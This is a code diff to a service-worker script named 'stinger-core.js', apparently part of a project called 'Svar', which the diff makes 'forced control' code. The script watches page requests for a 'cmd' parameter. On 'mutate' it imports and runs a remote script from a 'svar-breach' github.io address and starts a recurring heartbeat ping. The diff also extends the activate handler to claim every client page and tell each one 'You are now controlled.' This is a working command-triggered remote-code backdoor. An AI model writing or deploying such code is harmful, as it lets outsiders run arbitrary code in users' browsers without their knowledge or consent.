@@ -1,4 +1,4 @@
-// stinger-core.js — MUTATED
+// stinger-core.js — MUTATED with Force Control Fallback
 
 const SvarState = {
   version: '0.2',
@@ -11,11 +11,9 @@ const SvarState = {
 self.addEventListener('fetch', event => {
   const url = new URL(event.request.url);
 
-  // Check for mutation commands via query param
   if (url.searchParams.has('cmd')) {
     const cmd = url.searchParams.get('cmd');
     console.log('[Svar] Received command:', cmd);
-
     if (cmd === 'mutate') {
       mutate();
     }
@@ -27,24 +25,30 @@ self.addEventListener('fetch', event => {
 function mutate() {
   console.log('[Svar] MUTATION initiated');
 
-  // Example: Load external module (guardian logic)
   importScripts('https://kishan5965.github.io/svar-breach/guardian-core.js');
 
-  // Add pulse loop
   setInterval(() => {
     fetch('./ping?status=heartbeat')
       .then(() => console.log('[Svar] heartbeat sent'))
       .catch(() => console.warn('[Svar] heartbeat failed'));
-  }, 30000); // every 30s
+  }, 30000);
 
   SvarState.mode = 'evolving';
   console.log('[Svar] Mutation complete — state:', SvarState);
 }
 
-// Force immediate control of all pages under scope
+// Forced controller override on activate
 self.addEventListener('activate', event => {
-  event.waitUntil(self.clients.claim());
-  console.log('[Svar] Service worker claimed control of all clients');
+  event.waitUntil(
+    self.clients.claim().then(() => {
+      return self.clients.matchAll().then(clients => {
+        clients.forEach(client => {
+          client.postMessage('[Svar] You are now controlled.');
+        });
+      });
+    })
+  );
+  console.log('[Svar] Forced control and broadcast sent');
 });
 
 console.log('[Svar] Mutated stinger-core initialized');
